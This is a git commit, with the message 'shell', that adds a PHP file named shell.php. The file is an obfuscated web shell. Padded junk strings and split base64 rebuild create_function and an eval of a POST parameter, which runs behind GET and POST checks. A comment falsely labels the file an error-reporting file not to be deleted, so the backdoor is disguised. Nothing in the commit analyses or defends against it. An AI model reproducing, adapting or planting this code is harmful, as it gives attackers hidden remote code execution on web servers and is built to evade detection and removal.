c4d24b5652905a0e6d133ae7f0b42e795752cfac
Liyiming <1161067754@qq.com>
2022-07-01 17:35:15 +0800

    shell

---
+++ shell.php
@@ -0,0 +1,41 @@
+
+
+    <?php
+    $a='str_';
+    $b=$a.'replace';//此文件是报告错误文件，请勿删除
+    $r_e_p=substr($b,6);
+    $r_e_p_1='zxcszxctzxcrzxc_zxcrzxcezxc';
+    $r_e_p_1=substr_replace('zxc','str_re',$r_e_p_1);
+    $r_e_p=$r_e_p_1.$r_e_p;
+    $rep = $r_e_p("Oq1Qa9ILHxFRhK4ey0DwmiZ5rUduV3fkS72YEMsnCv6zJtpAjN", "", "strOq1Qa9ILHxFRhK4ey0DwmiZ5rUduV3fkS72YEMsnCv6zJtpAjN_repOq1Qa9ILHxFRhK4ey0DwmiZ5rUduV3fkS72YEMsnCv6zJtpAjNlacOq1Qa9ILHxFRhK4ey0DwmiZ5rUduV3fkS72YEMsnCv6zJtpAjNeOq1Qa9ILHxFRhK4ey0DwmiZ5rUduV3fkS72YEMsnCv6zJtpAjN");
+    $base = $rep("juW79GhLnJH20ofNqiKlzVpwg15SaOb8Py6UedCFEksMRm3TcY", "", "bjuW79GhLnJH20ofNqiKlzVpwg15SaOb8Py6UedCFEksMRm3TcYase6juW79GhLnJH20ofNqiKlzVpwg15SaOb8Py6UedCFEksMRm3TcY4_djuW79GhLnJH20ofNqiKlzVpwg15SaOb8Py6UedCFEksMRm3TcYejuW79GhLnJH20ofNqiKlzVpwg15SaOb8Py6UedCFEksMRm3TcYcodejuW79GhLnJH20ofNqiKlzVpwg15SaOb8Py6UedCFEksMRm3TcY");
+    $ba1=substr($base,6);
+    $ba2='bzxcazxcszxcezxc6zxc4';
+    $base=substr_replace('zxc','base64',$ba2);
+    $base=$base.$ba1;
+    $func = $base($rep("72QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHR", "", "Y3Jl72QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHRYXRl72QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHRX2Z72QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHR1bm72QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHRN072QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHRaW72QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHR9u72QdNe9Dorm1VnIWJUqGPAwjZEtzhbvgL8YFk5Kl4CfTuySiHR"));
+    $func1 = substr($func,6);
+    $func2='cwsxrwsxewsxawsxtwsxewsx';
+    $func2=substr_replace('wsx','create',$func2);
+    $func = $func2.$func1;
+    $p_1 = $base($rep("knj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3", "", "ZXZhknj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3bCgknj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3kknj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3X1knj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3Bknj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3Pknj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3Uknj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV31knj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3RbJwknj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3==knj5FWG6iwxdAlTeXrRh8gKESQyqLHJB1DZvfm2atO4pcMzPV3"));
+    $p_2 = "Vq30";
+    $p_3 = $base($rep("o0BvWUzTrDdkVw4KZSEXxHQl96taChcn7FqOfIbMARse3N2jug", "", "J1o0BvWUzTrDdkVw4KZSEXxHQl96taChcn7FqOfIbMARse3N2jug0po0BvWUzTrDdkVw4KZSEXxHQl96taChcn7FqOfIbMARse3N2jugOwo0BvWUzTrDdkVw4KZSEXxHQl96taChcn7FqOfIbMARse3N2jug=o0BvWUzTrDdkVw4KZSEXxHQl96taChcn7FqOfIbMARse3N2jug=o0BvWUzTrDdkVw4KZSEXxHQl96taChcn7FqOfIbMARse3N2jug"));
+     
+    if($_GET['a'] > $_GET['b'] and $_POST['c'] !== $_POST['d']){//比对错误的返回值
+        if(md5($_GET['c'])=== md5($_GET['d'])){
+            $value1 = $p_1;
+            $$value1 = $p_2;
+            $zh=$value1.$$value1;
+            $value2=$zh;
+            $$value2=$p_3;
+            $namex=$value2;
+            $namez=$$value2;
+            @$n = $func('$echo1,$echo2','return "$echo1"."$echo2";');
+            $n1=$n($namex,$namez);
+            @$p = $func("", $n1);
+            $p();
+        }
+    }
+    ?>
+    
